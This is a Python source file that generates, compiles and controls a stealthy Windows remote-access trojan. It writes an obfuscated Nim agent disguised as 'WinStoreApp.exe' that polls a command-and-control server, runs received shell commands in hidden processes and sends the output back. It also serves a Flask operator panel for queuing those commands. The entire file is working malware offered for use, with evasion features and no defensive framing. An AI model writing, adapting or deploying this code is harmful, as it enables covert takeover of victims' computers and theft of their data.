import os
import subprocess
import base64
import random
import string
from flask import Flask, request, render_template_string

EXE_NAME = "WinStoreApp.exe"

def xor_cipher(data, key):
    return [ord(c) ^ key for c in data]

def get_stealth_nim(c2_url):
    key = random.randint(1, 254)
    enc_cmd = xor_cipher("cmd.exe /c ", key)
    enc_ua = xor_cipher("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36", key)
    
    return f'''
import httpclient, os, strutils, base64, random, osproc, streams

const junkData = "{''.join(random.choices(string.ascii_letters, k=500))}"

proc dec(data: openArray[int], key: int): string =
  result = ""
  for b in data: result.add(chr(b xor key))

let k = {key}
let cmdStr = dec({enc_cmd}, k)
let uaStr = dec({enc_ua}, k)

proc runHidden(cmd: string): string =
  try:
    var p = startProcess(cmdStr & cmd, options = {{poHideWindow, poDaemon, poShell, poStdErrToStdOut}})
    let outStream = p.outputStream()
    result = outStream.readAll()
    p.close()
  except: result = "Err"

let client = newHttpClient()
client.headers = newHttpHeaders({{
    "User-Agent": uaStr,
    "Accept": "*/*",
    "ngrok-skip-browser-warning": "1"
}})

while true:
  try:
    let task = client.getContent("{c2_url}/get_task")
    if task != "" and task != "none":
        let output = runHidden(task)
        discard client.postContent("{c2_url}/post_result", base64.encode(output))
  except:
    discard
  sleep(3500 + rand(2000))
'''

app = Flask(__name__)
task_queue = []
last_output = "💎 STEALTH_MODE_ACTIVE - Awaiting Agent..."

HTML_PANEL = """
<!DOCTYPE html>
<body style="background:#000; color:#0f0; font-family:monospace; padding:50px;">
    <h2>💎 STEALTH C2 ORCHESTRATOR</h2>
    <div style="border:1px solid #0f0; height:400px; overflow-y:auto; padding:20px; background:#050505;">
        <pre id="log">{{ output }}</pre>
    </div><br>
    <input type="text" id="i" style="width:70%; background:#000; color:#0f0; border:1px solid #0f0; padding:10px;">
    <button onclick="s()" style="padding:10px; background:#0f0; color:#000; border:none; cursor:pointer;">RUN</button>
    <script>
        function s() {
            let v = document.getElementById('i').value;
            fetch('/set_task?c=' + btoa(v));
            document.getElementById('i').value = '';
        }
        setInterval(() => { location.reload(); }, 4000);
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_PANEL, output=last_output)

@app.route('/get_task')
def get_task(): return task_queue.pop(0) if task_queue else "none"

@app.route('/set_task')
def set_task():
    task_queue.append(base64.b64decode(request.args.get('c')).decode())
    return "ok"

@app.route('/post_result', methods=['POST'])
def post_result():
    global last_output
    try:
        last_output = base64.b64decode(request.data).decode('utf-8', errors='ignore')
    except:
        pass
    return "ok"

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2: sys.exit(1)
    mode = sys.argv[1]
    if mode == "build":
        url = sys.argv[2]
        with open('agent.nim', 'w') as f: f.write(get_stealth_nim(url))
        cmd = f"nim c -d:mingw -d:danger -d:ssl -d:strip --cpu:amd64 --opt:size --app:gui -o:{EXE_NAME} agent.nim"
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if os.path.exists('agent.nim'): os.remove('agent.nim')
        if res.returncode == 0:
            print(f"SUCCESS: {EXE_NAME}")
        else:
            print(f"FAILED:\\n{res.stderr}")
    elif mode == "listen":
        app.run(host='0.0.0.0', port=4444)